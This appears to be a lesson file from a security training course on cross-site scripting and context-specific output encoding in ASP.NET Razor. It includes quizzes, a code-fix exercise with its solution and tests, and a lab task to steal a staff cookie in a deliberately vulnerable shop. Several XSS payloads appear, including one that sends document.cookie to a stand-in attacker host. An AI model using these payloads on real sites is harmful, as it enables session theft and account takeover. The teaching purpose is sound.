@@ -1,0 +1,201 @@
+{
+  "title": "XSS and output encoding",
+  "summary": "When text becomes code in someone else's browser. Reflected, stored and DOM XSS, why encoding depends on where the text lands (HTML, attribute, URL, JavaScript), Razor's auto-encoding and the Html.Raw opt-out.",
+  "minutes": 18,
+  "steps": [
+    {
+      "type": "learn",
+      "title": "Text that becomes code",
+      "body": [
+        "```text",
+        "GET /search?q=<script>new Image().src='https://evil.example/c?'+document.cookie</script>",
+        "",
+        "HTTP/1.1 200 OK",
+        "Content-Type: text/html",
+        "",
+        "<h1>Results for <script>new Image().src='https://evil.example/c?'+document.cookie</script></h1>",
+        "```",
+        "",
+        "The server pasted the search term into HTML, so the browser runs it as a script, **on the shop's origin**: it can read the page, call the API as the user, and (if the cookie is not `HttpOnly`) send the session away. That is **cross-site scripting**, filed under A05 Injection.",
+        "",
+        "- **Reflected**: the payload is in the request and comes straight back (a link someone is tricked into opening).",
+        "- **Stored**: the payload is saved (a review, a display name, a support ticket) and served to everyone who views it, staff included. The worst kind: no link needed.",
+        "- **DOM-based**: the server never sees it; the page's own JavaScript writes attacker data into the DOM, e.g. `el.innerHTML = location.hash.slice(1)`."
+      ]
+    },
+    {
+      "type": "sort",
+      "prompt": "Which kind of XSS is each?",
+      "buckets": ["Reflected", "Stored", "DOM-based"],
+      "items": [
+        ["`/search?q=<script>...` shown on the results page", 0],
+        ["An error page that repeats the bad `returnUrl` it was given", 0],
+        ["A product review with `<img src=x onerror=...>` in it", 1],
+        ["A display name with a script, shown on the staff dashboard", 1],
+        ["`document.getElementById('msg').innerHTML = location.hash.slice(1)`", 2],
+        ["A single-page app that does `el.innerHTML = new URLSearchParams(location.search).get('name')`", 2]
+      ]
+    },
+    {
+      "type": "learn",
+      "title": "Encode for the place it lands",
+      "body": [
+        "The fix is **output encoding**: turn characters that mean something in the surrounding syntax into a harmless spelling. Which characters matter depends on the **context**:",
+        "",
+        "| Context | Example | Encoder (`System.Text.Encodings.Web`) | `lamps & <b>` becomes |",
+        "|---|---|---|---|",
+        "| HTML text | `<h1>{q}</h1>` | `HtmlEncoder.Default` | `lamps &amp; &lt;b&gt;` |",
+        "| quoted attribute | `<input value=\"{q}\">` | `HtmlEncoder.Default` (always quote attributes) | the same |",
+        "| URL parameter | `<a href=\"/s?q={q}\">` | `UrlEncoder.Default` | `lamps%20%26%20%3Cb%3E` |",
+        "| JavaScript string | `<script>var t = '{q}'</script>` | `JavaScriptEncoder.Default` | `lamps \\u0026 \\u003Cb\\u003E` |",
+        "",
+        "Two contexts have no safe encoding: an **unquoted** attribute, and a **URL that is the whole `href`** (`javascript:alert(1)` contains nothing to encode). For the second, check the scheme (`https:` only) before you write it.",
+        "",
+        "Encode **on output**, not on input: the same review is shown in HTML, sent in JSON and put in a CSV, and each needs different encoding."
+      ]
+    },
+    {
+      "type": "match",
+      "prompt": "Match each place in a page to the encoder it needs.",
+      "pairs": [
+        ["`<p>Hello, {name}</p>`", "`HtmlEncoder`"],
+        ["`<a href=\"/search?q={term}\">`", "`UrlEncoder`"],
+        ["`<script>const user = '{name}';</script>`", "`JavaScriptEncoder`"],
+        ["`<a href=\"{website}\">` (the whole URL is the user's)", "check the scheme is https, then `HtmlEncoder`"]
+      ]
+    },
+    {
+      "type": "learn",
+      "title": "Razor encodes for you. Html.Raw does not.",
+      "body": [
+        "Razor HTML-encodes every `@expression`:",
+        "",
+        "```cshtml",
+        "<div class=\"body\">@review.Body</div>          @* <script> arrives as &lt;script&gt; *@",
+        "<div class=\"body\">@Html.Raw(review.Body)</div> @* the opt-out: written as it is *@",
+        "```",
+        "",
+        "So in Razor, XSS almost always comes from one of four places, and these are what to search for in review:",
+        "",
+        "1. `@Html.Raw(...)` or `new HtmlString(...)` on anything a user could have typed;",
+        "2. HTML built as a string in C# (`$\"<b>{name}</b>\"`) and returned with `Results.Content(..., \"text/html\")`;",
+        "3. JavaScript that writes into the DOM with `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, or jQuery's `.html()`; use `textContent` instead;",
+        "4. `href`/`src` from user data (`javascript:` URLs).",
+        "",
+        "When users really need formatting (bold, links), sanitize on the server with an allow-list sanitizer (the `HtmlSanitizer` NuGet package) or in the browser with **DOMPurify**, never with a home-made regex."
+      ]
+    },
+    {
+      "type": "mcq",
+      "prompt": "A product page shows `@Html.Raw(review.Body)` because \"old reviews have `<b>` tags\". What is the right fix?",
+      "options": [
+        "Show `@review.Body`, and if formatting must stay, run the HTML through an allow-list sanitizer before `Html.Raw`",
+        "Strip `<script>` with a regex before saving",
+        "Keep `Html.Raw` and add a CSP",
+        "Encode the review when it is saved, then use `Html.Raw`"
+      ],
+      "answer": 0,
+      "explain": "`<script>` is one of hundreds of ways to run code (`<img onerror>`, `<svg onload>`, `<a href=javascript:>`). A CSP is a strong second layer, not a reason to keep the first one broken. Encoding at save time breaks every non-HTML use of the text."
+    },
+    {
+      "type": "code",
+      "mode": "fix",
+      "framework": "web",
+      "title": "Encode the search page, context by context",
+      "prompt": [
+        "The search page pastes `q` into four places. Encode each for its context (add `using System.Text.Encodings.Web;` at the top):",
+        "",
+        "- the `<h1>` text and the `value` attribute: `HtmlEncoder.Default.Encode(q)`;",
+        "- the `href` query parameter: `UrlEncoder.Default.Encode(q)`;",
+        "- the JavaScript string: `JavaScriptEncoder.Default.Encode(q)`.",
+        "",
+        "**Run checks** sends classic payloads for each context, and `lamps & bulbs`, which must still display correctly."
+      ],
+      "starter": [
+        "var builder = WebApplication.CreateBuilder(args);",
+        "var app = builder.Build();",
+        "",
+        "app.MapGet(\"/search\", (string? q) =>",
+        "{",
+        "    q ??= \"\";",
+        "    var html = $\"\"\"",
+        "        <!doctype html>",
+        "        <h1>Results for {q}</h1>",
+        "        <a href=\"/search?q={q}&page=2\">Next page</a>",
+        "        <input name=\"q\" value=\"{q}\">",
+        "        <script>var term = '{q}'; console.log(term);</script>",
+        "        \"\"\";",
+        "    return Results.Content(html, \"text/html\");",
+        "});",
+        "",
+        "app.Run();"
+      ],
+      "solution": [
+        "using System.Text.Encodings.Web;",
+        "",
+        "var builder = WebApplication.CreateBuilder(args);",
+        "var app = builder.Build();",
+        "",
+        "app.MapGet(\"/search\", (string? q) =>",
+        "{",
+        "    q ??= \"\";",
+        "    var inHtml = HtmlEncoder.Default.Encode(q);",
+        "    var inUrl = UrlEncoder.Default.Encode(q);",
+        "    var inJs = JavaScriptEncoder.Default.Encode(q);",
+        "    var html = $\"\"\"",
+        "        <!doctype html>",
+        "        <h1>Results for {inHtml}</h1>",
+        "        <a href=\"/search?q={inUrl}&page=2\">Next page</a>",
+        "        <input name=\"q\" value=\"{inHtml}\">",
+        "        <script>var term = '{inJs}'; console.log(term);</script>",
+        "        \"\"\";",
+        "    return Results.Content(html, \"text/html\");",
+        "});",
+        "",
+        "app.Run();"
+      ],
+      "hints": [
+        "Compute three encoded versions of `q` before building the string, and use each in its place.",
+        "`JavaScriptEncoder.Default.Encode(\"';alert(1)//\")` gives `\\u0027;alert(1)//`: the quote cannot end the string any more."
+      ],
+      "template": [
+        "{{CODE}}",
+        "",
+        "static class DojoTests",
+        "{",
+        "    static async Task<string> Page(HttpClient http, string q) => await DojoWeb.Text(await http.GetAsync(\"/search?q=\" + Uri.EscapeDataString(q)));",
+        "",
+        "    public static async Task Run(HttpClient http)",
+        "    {",
+        "        await Dojo.TryAsync(\"The search page could be loaded\", async () =>",
+        "        {",
+        "            var p = await Page(http, \"lamps & bulbs\");",
+        "            Dojo.Check(\"HTML text: lamps &amp; bulbs\", p.Contains(\"<h1>Results for lamps &amp; bulbs</h1>\"), p);",
+        "            Dojo.Check(\"attribute: value=\\\"lamps &amp; bulbs\\\"\", p.Contains(\"value=\\\"lamps &amp; bulbs\\\"\"), p);",
+        "            Dojo.Check(\"URL: q=lamps%20%26%20bulbs\", p.Contains(\"href=\\\"/search?q=\" + System.Text.Encodings.Web.UrlEncoder.Default.Encode(\"lamps & bulbs\") + \"&page=2\\\"\"), p);",
+        "            Dojo.Check(\"JavaScript: 'lamps \\\\u0026 bulbs'\", p.Contains(\"var term = '\" + System.Text.Encodings.Web.JavaScriptEncoder.Default.Encode(\"lamps & bulbs\") + \"'\"), p);",
+        "            p = await Page(http, \"<script>alert(1)</script>\");",
+        "            Dojo.Check(\"a <script> payload is not written as a tag\", !p.Contains(\"<script>alert(1)\"), p);",
+        "            p = await Page(http, \"\\\"><img src=x onerror=alert(1)>\");",
+        "            Dojo.Check(\"an attribute-breaking payload cannot add an <img>\", !p.Contains(\"<img src=x\") && !p.Contains(\"\\\"><img\"), p);",
+        "            p = await Page(http, \"';alert(1)//\");",
+        "            Dojo.Check(\"a quote cannot end the JavaScript string\", !p.Contains(\"';alert(1)//\"), p);",
+        "            p = await Page(http, \"</script><script>alert(1)</script>\");",
+        "            Dojo.Check(\"</script> cannot close the script block\", !p.Contains(\"</script><script>alert(1)\"), p);",
+        "        });",
+        "    }",
+        "}"
+      ]
+    },
+    {
+      "type": "lab",
+      "live": "26-vulnerable-shop",
+      "task": "t7",
+      "title": "Live lab: steal the staff session with stored XSS",
+      "prompt": [
+        "In the **vulnerable shop** lab, do **Attack: steal the staff session with stored XSS**. A real Chromium on the bot host reads your review as a signed-in member of staff; your script sends their cookie to your `listen` server, and you use it. The fix is in the next lesson, together with a Content-Security-Policy."
+      ],
+      "explain": "One `Html.Raw` and one cookie without `HttpOnly` turned a review box into a staff account takeover."
+    }
+  ]
+}
